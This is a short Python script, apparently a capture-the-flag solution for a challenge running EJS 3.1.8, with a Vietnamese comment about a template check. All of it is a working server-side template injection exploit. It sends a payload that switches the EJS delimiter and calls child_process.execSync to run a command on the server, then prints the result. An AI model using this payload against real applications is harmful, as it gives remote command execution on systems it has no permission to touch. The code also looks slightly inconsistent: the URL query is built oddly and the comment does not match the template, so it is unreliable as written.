import requests

url = "http://ejs-3.1.8-7548cb2a.dailycookie.cloud"

# cho thêm {{ name }} vì trong code có check xem template nhập vào có chứa chuỗi đó không
tmpl = """<.= global.process.mainModule.require('child_process').execSync('/readflag') .>"""


param = {
    "name": tmpl
}
res = requests.post(url , params=param, allow_redirects=False)


res = requests.get(url+ "&delimiter=.")

print(res.text)